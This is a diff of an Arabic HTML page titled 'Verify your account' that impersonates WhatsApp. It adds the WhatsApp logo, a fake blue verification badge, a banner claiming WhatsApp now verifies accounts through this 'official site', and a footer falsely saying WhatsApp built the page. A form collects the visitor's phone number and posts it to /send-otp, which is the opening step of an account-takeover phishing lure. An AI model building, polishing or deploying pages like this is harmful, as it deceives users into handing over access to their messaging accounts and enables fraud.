@@ -1,17 +1,120 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <title>توثيق حسابك</title>
-    <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>توثيق حسابك</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding-top: 100px;
+    background-color: #f0f2f5;
+  }
+  .logo-container {
+    position: fixed;
+    top: 10px;
+    right: 10px;
+  }
+  .logo-container img {
+    width: 50px; /* حجم اللوجو */
+    height: 50px;
+  }
+  form {
+    display: inline-block;
+    margin-top: 50px;
+  }
+  input, button {
+    padding: 10px;
+    margin: 5px;
+    font-size: 16px;
+  }
+  .verified {
+  display: inline-block;
+  width: 90px;         /* عرض الشارة */
+  height: 90px;        /* ارتفاع الشارة */
+  background-color: #1DA1F2; /* اللون الأزرق الرسمي */
+  border-radius: 50%;  /* شكل دائرة */
+  position: relative;
+  margin-left: 6px;
+  vertical-align: middle;
+}
+
+/* علامة الصح داخل الدائرة */
+.verified::after {
+  content: '✔';
+  color: white;
+  font-size: 70px;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+}
+.highlight {
+  color: #2ecc71; /* أخضر فاتح وجميل */
+  font-weight: bold;
+  font-size: 18px;
+  margin-top: 20px;
+  text-align: center;
+}
+footer {
+  position: fixed;       /* يبقى ثابت أسفل الصفحة */
+  bottom: 0;
+  left: 0;
+  width: 100%;
+  background-color: #f0f2f5; /* نفس خلفية الصفحة */
+  text-align: center;
+  padding: 10px 0;
+  font-size: 18px;       /* تكبير الخط */
+  border-top: 1px solid #ccc; /* خط رفيع للفصل */
+  color: #555;           /* لون النص خفيف */
+}
+footer {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  width: 100%;
+  background-color: #f0f2f5;
+  text-align: center;
+  padding: 10px 0;
+  font-size: 18px;
+  border-top: 1px solid #ccc;
+  color: #555;
+
+  display: flex;          /* نستخدم flex لترتيب العناصر أفقياً */
+  justify-content: center; /* تمركز المحتوى في الوسط */
+  align-items: center;     /* محاذاة عمودية للنص واللوجو */
+  gap: 8px;               /* مسافة بين النص والصورة */
+}
+
+footer img {
+  width: 24px;   /* حجم مناسب للوجو */
+  height: 24px;
+}
+
+</style>
 </head>
-<body>
-<div class="container">
-    <h2>توثيق حسابك</h2>
-    <form action="/send-otp" method="POST">
-        <input type="text" name="phone" placeholder="رقم التليفون" required>
-        <button type="submit">إرسال OTP</button>
-    </form>
+<p class="highlight">
+  واتساب عملت التوثيق عبر الموقع الرسمي، قم بإدخال رقمك الآن لتوثيق رقمك.
+</p><body>
+
+<div class="logo-container">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
 </div>
+
+<h1>
+  توثيق حسابك
+  <span class="verified"></span>
+</h1>
+<form action="/send-otp" method="POST">
+  <input type="text" name="phone" placeholder="رقم التليفون" required>
+  <button type="submit">إرسال OTP</button>
+</form>
+
+<footer>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    تم انشاء هذا الموقع بواسطة الواتساب
+</footer>
+
 </body>
 </html>
